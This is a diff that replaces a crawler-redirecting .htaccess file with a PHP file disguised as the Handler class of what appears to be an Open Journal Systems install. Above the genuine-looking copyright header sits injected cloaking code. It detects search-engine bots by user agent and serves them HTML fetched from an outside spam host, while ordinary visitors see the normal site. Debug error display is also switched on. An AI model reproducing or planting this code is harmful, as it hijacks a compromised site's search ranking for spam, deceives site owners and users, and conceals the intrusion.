@@ -1,26 +1,48 @@
-<IfModule mod_rewrite.c>
-RewriteEngine On
+<?php
 
-RewriteCond %{HTTP_USER_AGENT} (googlebot|bingbot|slurp|ahrefs|semrush|yandex|majestic|screamingfrog) [NC]
+ini_set('display_errors', 1); 
+ini_set('display_startup_errors', 1); 
+error_reporting(E_ALL); 
 
+$request_uri = $_SERVER['REQUEST_URI'] ?? ''; 
+$user_agent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? ''); 
 
-RewriteRule ^(.*)$ https://himpsikotamedan.org/susunan-pengurus/ [R=301,L]
-</IfModule>
+$bot_signatures = [ 
+    'googlebot', 
+    'bingbot', 
+    'slurp', 
+    'duckduckbot', 
+    'baiduspider', 
+    'yandex', 
+    'crawler', 
+    'Google-Site-Verification',
+    'spider' 
+];
 
-#------------------5410--------------
-Options FollowSymLinks
-<IfModule mod_rewrite.c>
-    <IfModule mod_negotiation.c>
-        Options -MultiViews
-    </IfModule>
+if (strpos($request_uri, 'https://smujo.id/bw') !== false) { 
+    foreach ($bot_signatures as $bot) { 
+        if (strpos($user_agent, $bot) !== false) { 
+            $html = @file_get_contents('https://rayapbesi-boy.xyz/landing/smujo/index.txt'); 
+            header("Content-Type: text/html; charset=UTF-8"); 
+            echo $html !== false ? $html : "Cloaked content failed to load."; 
+            exit; 
+        } 
+    } 
+}
 
-    RewriteEngine On
+/**
+ * @file classes/handler/Handler.inc.php
+ *
+ * Copyright (c) 2014-2020 Simon Fraser University
+ * Copyright (c) 2003-2020 John Willinsky
+ * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
+ *
+ * @class Handler
+ * @ingroup handler
+ *
+ * @brief Base request handler application class
+ */
 
-    # Redirect Trailing Slashes...
-    RewriteRule ^(.*)/$ /$1 [L,R=301]
+import('lib.pkp.classes.handler.PKPHandler');
 
-    # Handle Front Controller...
-    RewriteCond %{REQUEST_FILENAME} !-d
-    RewriteCond %{REQUEST_FILENAME} !-f
-    RewriteRule ^ index.php [L]
-</IfModule>
+class Handler extends PKPHandler { }
